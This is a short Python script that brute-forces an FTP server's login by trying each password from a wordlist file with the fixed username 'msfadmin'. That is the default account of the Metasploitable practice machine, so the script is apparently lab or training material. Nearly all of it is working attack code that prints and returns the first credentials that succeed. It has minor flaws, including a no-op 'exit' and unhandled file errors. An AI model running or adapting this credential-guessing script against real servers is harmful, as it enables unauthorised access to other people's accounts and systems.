import ftplib
import sys

def ftpLogin(host, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print(" No file .....")

    for line in pF.readlines():
        userName = "msfadmin"
        passWord = line.split(':')[0].strip('\n')
        print("Trying (login/passowrd): " + userName + " / " + passWord)

        try:
            ftp = ftplib.FTP(host)
            login = ftp.login(userName, passWord)
            print("Login Suceeded with: " + userName + "/" + passWord)
            ftp.quit()
            return(userName, passWord)
        except:
            exit

    print("Password not in list")

host = str(sys.argv[1])
passwdFile = str(sys.argv[2])

ftpLogin(host, passwdFile)
